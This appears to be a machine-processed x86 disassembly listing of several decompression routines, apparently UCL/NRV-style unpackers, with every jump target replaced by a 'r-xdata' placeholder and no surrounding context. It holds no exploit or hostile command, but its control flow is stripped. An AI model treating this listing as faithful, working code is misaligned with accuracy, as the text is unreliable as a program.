mov ebx edi
mov [ ebp - 0x5c ] eax
mov [ ebp - 0xe8 ] ebx
mov [ ebp - 0xf8 ] ecx
jne r-xdata
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xbc ]
mov [ ebp - 0xe0 ] edx
mov ecx [ esi + 0x10 ]
mov eax 0x1
add [ ebp - 0xd8 ] eax
push 0x0
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
mov [ ebp - 0x160 ] ecx
call sub_404240
add esp 0x4
jne r-xdata
cmp ecx [ ebp - 0x84 ]
ja r-xdata
cmp ecx 0x500
ja r-xdata
mov eax [ ebp - 0xdc ]
xor esi esi
cmp [ eax ] esi
jbe r-xdata
mov edx [ ebp - 0xe0 ]
mov ecx [ ebp - 0xd8 ]
push edx
lea eax [ ebp - 0xd4 ]
call sub_404880
mov eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0xd4 ]
push ebx
push ecx
mov [ ebp - 0xd8 ] 0x0
call sub_404780
mov edx [ ebp - 0xdc ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x160 ] eax
inc esi
mov eax ebx
push esi
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_404240
mov esi [ ebp - 0xdc ]
add esp 0x14
jmp r-xdata
cmp edi [ eax + 0x8 ]
jae r-xdata
mov edi [ ebp - 0xcc ]
cmp ecx [ ebp - 0xc0 ]
je r-xdata
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_404930
mov [ ebp - 0xf4 ] eax
mov eax [ ebp - 0xdc ]
mov eax [ eax ]
dec edi
mov [ ebp - 0xec ] eax
cmp eax edi
jbe r-xdata
cmp [ ebp - 0xec ] esi
jbe r-xdata
mov [ ebp - 0xec ] edi
mov [ ebp - 0xe4 ] esi
jmp r-xdata
cmp [ ebp - 0xd0 ] ebx
jbe r-xdata
mov eax [ ebp - 0xdc ]
cmp ebx [ eax + 0x4 ]
jb r-xdata
mov edx [ eax + 0x10 ]
mov [ ebp - 0x160 ] edx
mov ecx [ eax + 0x10 ]
shr ecx 0x2
mov [ ebp - 0x160 ] ecx
jmp r-xdata
mov ebx [ ebp - 0xe8 ]
cmp esi [ ebp - 0xec ]
jb r-xdata
mov ecx [ ebp - 0xc8 ]
mov edx edi
lea eax [ ebp - 0xd4 ]
call sub_404930
test eax eax
js r-xdata
push 0x0
mov eax 0x1
lea ebx [ ebp - 0x170 ]
lea edi [ ebp - 0xd4 ]
call sub_404240
mov edi [ ebp - 0xcc ]
add [ ebp - 0xe4 ] 0x9
add esp 0x4
inc esi
cmp edi 0x2
jb r-xdata
mov edx [ ebp - 0xf4 ]
mov ecx edi
sub ecx [ ebp - 0xe8 ]
add ecx esi
lea edx [ edx + ecx * 4 ]
add edx ecx
mov ecx [ ebp - 0xe4 ]
add ecx eax
cmp edx ecx
jg r-xdata
inc [ ebp - 0x48 ]
add [ ebp - 0xd8 ] esi
mov esi [ ebp - 0xdc ]
jmp r-xdata
cmp [ ebp - 0xd0 ] 0x0
ja r-xdata
sub_404ef0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
lea esp [ esp ]
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov [ ebp - 0x4 ] ebx
mov edx 0x1
nop
mov dl [ eax + edi ]
mov esi [ ebp + 0x10 ]
mov [ ebx + esi ] dl
inc ebx
inc eax
jmp r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
test cl 0x7f
je r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
movzx ecx [ eax + edi ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
mov ebx [ ebp - 0x8 ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] ebx
mov ecx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
cmp eax ecx
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea ebx [ ecx + 0x1 ]
mov [ ebp - 0x8 ] ebx
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
test dl 0x7f
je r-xdata
mov edi [ ebp - 0x4 ]
mov esi 0x500
cmp esi ebx
sbb esi esi
neg esi
add edx esi
mov esi edi
sub esi ebx
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x10 ]
mov bl [ esi + edx ]
add esi edx
mov [ edi + edx ] bl
inc edi
inc esi
mov edi edi
mov edx 0x1
lea ecx [ ecx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 ]
test edx edx
jne r-xdata
mov bl [ esi ]
mov [ edi + edx ] bl
inc edi
inc esi
dec [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
test cl 0x7f
je r-xdata
test cl 0x7f
je r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_4050c0
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ecx ecx
xor eax eax
push edi
xor ebx ebx
mov [ ebp - 0x8 ] 0x1
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
nop
mov dl [ eax + esi ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
inc ebx
inc eax
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
lea edx [ ecx + ecx ]
test dx dx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
mov ecx edx
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
cmp edi 0x2
jne r-xdata
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
movzx ecx [ eax + esi ]
add edi 0xfffffffd
shl edi 0x8
add ecx edi
inc eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
add edx edx
mov [ ebp - 0x4 ] ecx
test dx dx
je r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] ebx
mov ecx [ ebp + 0x8 ]
pop edi
pop ebx
cmp eax ecx
jne r-xdata
mov edi ecx
not edi
shr ecx 0x1
and edi 0x1
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
mov edi edx
shr edi 0x10
and edi 0x1
jmp r-xdata
mov edi edx
shr edi 0x10
and edi 0x1
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
sbb eax eax
and eax 0xfffffffc
add eax 0xffffff37
mov esp ebp
pop ebp
retn
xor eax eax
mov esp ebp
pop ebp
retn
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
mov edx 0x500
cmp edx [ ebp - 0x4 ]
sbb edx edx
neg edx
add edi edx
mov [ ebp - 0xc ] edi
mov edi ebx
sub edi [ ebp - 0x4 ]
inc ebx
add edi [ ebp + 0xc ]
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
jmp r-xdata
mov edi 0x1
lea ecx [ ecx ]
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0xc ] edx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
add ecx ecx
lea edi [ edx + edi * 2 ]
test cx cx
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
jmp r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add edi 0x2
sub_4052f0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov [ ebp - 0x8 ] ebx
mov ebx 0x1
lea ebx [ ebx ]
mov dl [ esi + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc esi
jmp r-xdata
test edx edx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
mov [ ebp - 0x4 ] ebx
test ecx ecx
je r-xdata
cmp ebx 0x2
jne r-xdata
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx ebx [ esi + edi ]
add edx 0xfffffffd
shl edx 0x8
add ebx edx
inc esi
cmp ebx 0xffffffff
je r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
shr edx 0x1f
mov ecx 0x1f
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
dec ecx
mov edx eax
shr edx cl
and edx 0x1
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
mov edx ebx
not edx
shr ebx 0x1
and edx 0x1
inc ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
mov eax [ esi + edi ]
mov ecx 0x1f
dec ecx
mov ebx eax
shr ebx cl
mov edx eax
add esi 0x4
shr edx 0x1f
and ebx 0x1
jmp r-xdata
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + edi ]
mov ebx eax
add esi 0x4
mov ecx 0x1f
shr ebx 0x1f
dec ecx
mov ebx eax
shr ebx cl
and ebx 0x1
jmp r-xdata
lea ebx [ ebx + edx * 2 ]
test ebx ebx
jne r-xdata
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
mov edi 0x500
cmp edi edx
sbb edi edi
neg edi
add ebx edi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov edi ebx
sub edi edx
add edi [ ebp + 0x10 ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x10 ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
mov ebx 0x1
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0x10 ] edx
jne r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
lea ebx [ edx + ebx * 2 ]
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
add ebx 0x2
test edx edx
je r-xdata
sub_405510
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov edx 0x1
cmp eax [ ebp + 0xc ]
jae r-xdata
test ecx 0x100
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] esi
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp esi 0x1000002
ja r-xdata
mov ebx [ ebp + 0xc ]
mov esi ecx
shr esi 0x8
and esi 0x1
lea esi [ esi + edx * 2 ]
cmp eax ebx
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
mov [ ecx ] esi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + edi ]
mov ebx [ ebp + 0x10 ]
mov [ esi + ebx ] dl
inc esi
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
mov [ ebp - 0x4 ] esi
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
inc eax
lea edx [ ecx + ecx ]
jmp r-xdata
cmp esi 0x2
jne r-xdata
test dl 0x7f
je r-xdata
test edx 0x100
jne r-xdata
cmp eax ebx
jae r-xdata
mov ebx [ ebp - 0xc ]
test dl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
mov edx ecx
shr edx 0x8
inc eax
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
lea ecx [ edx + edx ]
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
add esi 0xfffffffd
shl esi 0x8
add ecx esi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx edx [ eax + edi ]
lea edx [ edx + edx + 0x1 ]
mov esi edx
shr esi 0x8
inc eax
and esi 0x1
jmp r-xdata
add edx edx
mov esi edx
shr esi 0x8
and esi 0x1
jmp r-xdata
test cl 0x7f
je r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edx
cmp eax ebx
jne r-xdata
mov esi ecx
not esi
and esi 0x1
shr ecx 0x1
lea ebx [ ecx + 0x1 ]
mov [ ebp - 0xc ] ebx
test dl 0x7f
je r-xdata
sbb eax eax
pop edi
and eax 0xfffffffc
pop esi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
lea ecx [ edx + edx ]
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov esi 0x500
cmp esi ebx
sbb esi esi
neg esi
add edx esi
mov [ ebp - 0x10 ] edx
add edx edi
cmp edx [ ebp - 0x8 ]
ja r-xdata
mov edx 0x1
mov edi edi
mov edx ecx
shr edx 0x8
and edx 0x1
lea edx [ edx + esi * 2 ]
test edx edx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] edi
pop edi
pop esi
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx edi
ja r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] edi
pop edi
pop esi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
mov esi edi
sub esi ebx
mov bl [ esi + edx ]
add esi edx
mov [ edi + edx ] bl
inc edi
inc esi
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov esi ecx
shr esi 0x8
and esi 0x1
lea edx [ esi + edx * 2 ]
cmp eax [ ebp + 0xc ]
jae r-xdata
mov bl [ esi ]
mov [ edi + edx ] bl
inc edi
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
test cl 0x7f
je r-xdata
test cl 0x7f
je r-xdata
movzx ecx [ eax + edi ]
lea ecx [ ecx + ecx + 0x1 ]
inc eax
add ecx ecx
jmp r-xdata
test cl 0x7f
je r-xdata
add edx 0x2
test ecx 0x100
je r-xdata
sub_4057d0
push ebp
mov ebp esp
sub esp 0x10
mov edx [ ebp + 0x10 ]
mov edx [ edx ]
push ebx
xor ecx ecx
xor eax eax
push edi
xor ebx ebx
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] edx
lea ecx [ ecx ]
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi 0x1
lea esp [ esp ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
pop edi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edi 0x1000002
ja r-xdata
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ eax + esi ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
inc ebx
inc eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] ebx
pop edi
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ecx + ecx ]
test dx dx
jne r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov ecx edx
shr ecx 0x10
and ecx 0x1
test ecx ecx
jne r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
cmp edi 0x2
jne r-xdata
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov ecx [ ebp - 0xc ]
add edx edx
mov [ ebp - 0x4 ] ecx
test dx dx
je r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov ecx [ ebp + 0x10 ]
pop edi
mov [ ecx ] ebx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + esi ]
add edi 0xfffffffd
shl edi 0x8
add ecx edi
inc eax
cmp ecx 0xffffffff
je r-xdata
movzx edx [ eax + esi + 0x1 ]
movzx ecx [ eax + esi ]
add eax 0x2
shl edx 0x8
add edx ecx
lea edx [ edx + edx + 0x1 ]
mov edi edx
shr edi 0x10
and edi 0x1
jmp r-xdata
mov edi edx
shr edi 0x10
and edi 0x1
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
mov [ edx ] ebx
cmp eax ecx
jne r-xdata
mov edi ecx
not edi
shr ecx 0x1
and edi 0x1
inc ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] ecx
lea ecx [ edx + edx ]
test cx cx
jne r-xdata
sbb eax eax
and eax 0xfffffffc
pop edi
add eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
test edi edi
jne r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edx 0x500
cmp edx [ ebp - 0x4 ]
sbb edx edx
neg edx
add edi edx
mov [ ebp - 0x10 ] edi
add edi ebx
cmp edi [ ebp - 0x8 ]
ja r-xdata
mov edi 0x1
mov edi edi
mov edx [ ebp + 0x10 ]
pop edi
mov [ edx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp edx ebx
ja r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
lea edi [ edx + edi * 2 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
mov edi ebx
sub edi edx
add edi [ ebp + 0xc ]
inc ebx
mov dl [ edi ]
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ ebx + edi - 0x1 ] dl
cmp edi [ ebp - 0x8 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx ]
mov edi [ ebp + 0xc ]
mov [ ebx + edi ] dl
mov edx 0x1
add [ ebp - 0x4 ] edx
add ebx edx
sub [ ebp - 0x10 ] edx
jne r-xdata
jmp r-xdata
add ecx ecx
test cx cx
jne r-xdata
mov edx ecx
shr edx 0x10
and edx 0x1
test edx edx
je r-xdata
movzx ecx [ eax + esi + 0x1 ]
movzx edx [ eax + esi ]
add eax 0x2
shl ecx 0x8
add ecx edx
lea ecx [ ecx + ecx + 0x1 ]
add ecx ecx
test cx cx
jne r-xdata
add edi 0x2
sub_405ac0
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0x14 ]
mov edx [ edx ]
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
xor eax eax
xor esi esi
xor ebx ebx
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x10 ] edx
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov ebx 0x1
nop
cmp esi [ ebp + 0xc ]
jae r-xdata
test edx edx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
mov eax [ ebp + 0x14 ]
pop edi
mov [ eax ] ebx
pop esi
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
pop edi
pop esi
mov [ eax ] edx
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
cmp edx 0x1000002
ja r-xdata
lea edx [ edx + ebx * 2 ]
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
cmp esi ebx
jae r-xdata
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] ebx
mov eax 0xffffff36
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ esi + edi ]
mov edi [ ebp + 0x10 ]
mov [ ebx + edi ] dl
mov edi [ ebp + 0x8 ]
inc ebx
inc esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
pop edi
pop esi
mov [ edx ] ecx
mov eax 0xffffff35
pop ebx
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] ebx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov edx eax
add esi 0x4
mov ecx 0x1f
shr edx 0x1f
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
test ecx ecx
je r-xdata
test edx edx
jne r-xdata
cmp esi ebx
jae r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] edx
test ecx ecx
je r-xdata
mov eax [ esi + edi ]
mov ebx [ ebp - 0x8 ]
mov edx eax
add esi 0x4
shr edx 0x1f
mov ecx 0x1f
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
mov ebx [ ebp - 0x8 ]
dec ecx
mov edx eax
shr edx cl
and edx 0x1
lea ebx [ edx + ebx * 2 - 0x2 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x14 ]
pop edi
pop esi
mov [ ecx ] eax
mov eax 0xffffff37
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
movzx ebx [ esi + edi ]
add edx 0xfffffffd
shl edx 0x8
add ebx edx
inc esi
cmp ebx 0xffffffff
je r-xdata
mov eax [ esi + edi ]
mov ecx 0x1f
dec ecx
mov ebx eax
shr ebx cl
mov edx eax
add esi 0x4
shr edx 0x1f
and ebx 0x1
jmp r-xdata
dec ecx
mov edx eax
shr edx cl
and edx 0x1
jmp r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edx
mov eax [ ebp + 0xc ]
cmp esi eax
jne r-xdata
mov edx ebx
